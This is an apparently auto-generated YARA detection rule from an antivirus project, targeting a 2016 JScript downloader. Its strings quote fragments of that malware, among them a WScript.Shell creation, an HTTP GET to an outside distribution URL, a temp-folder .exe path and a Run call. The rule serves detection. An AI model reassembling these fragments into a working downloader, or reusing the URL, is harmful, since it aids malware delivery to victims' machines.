rule sig_20160401_4369a21c697cdd92be3d0f8f735898aa {
  meta:
    description = "datamaliciousorder - file 20160401_4369a21c697cdd92be3d0f8f735898aa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bcb27b37986dc2e7b8b52308a18a9b1dfbddbb70f0c2df37e782fc3c4a9121f7"

  strings:
    $s1  = "var LiEnl = function EtPu() {return WScript[IwbTo](\"WScript\"+\".Shell\");}(), MwSb = 11;" fullword ascii
    $s2  = "function OnBvz(HdSij, HdTvr){YhOr = YhOr * 1; return HdSij - HdTvr;};" fullword ascii
    $s3  = "if (AtWzk[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "AtWzk[JtQbq](\"G\" + \"ET\", \"http://prawoiznaki.pl/k3usa\", false);" fullword ascii
    $s5  = "function YsmHw() {return LiEnl[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"kQ1hifNlFQNNbxwI.ex\" + \"e\";};" fullword ascii
    $s6  = "function KnJm(){return LbGtl + \"\";};" fullword ascii
    $s7  = "function IzzEep() {return ((KmGj == true) && (KmGj == XfGm)) ? 1 : YhOr;};" fullword ascii
    $s8  = "}while (PqHeg);" fullword ascii
    $s9  = "function RbjSwu(MwxGx){LiEnl[\"R\"+\"un\"](MwxGx, YhOr, YhOr);};" fullword ascii
    $s10 = "var IbBh = false;" fullword ascii
    $s11 = "function KhzPp()" fullword ascii
    $s12 = "XfGm = true; " fullword ascii
    $s13 = "var KmGj = false;" fullword ascii
    $s14 = "var YyEyt = new this[\"Date\"]();" fullword ascii
    $s15 = "KmGj = true; " fullword ascii
    $s16 = "function KmBcz(){return 23;};" fullword ascii
    $s17 = "function CluBmn(){return IwbTo;};" fullword ascii
    $s18 = "var XfGm = false;" fullword ascii
    $s19 = "function SrdNt(UeHsv) {var RvQi = (1, 2, 3, 4, 5, UeHsv); return RvQi;};" fullword ascii
    $s20 = "return OnBvz(QwvNb, ZhZq);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}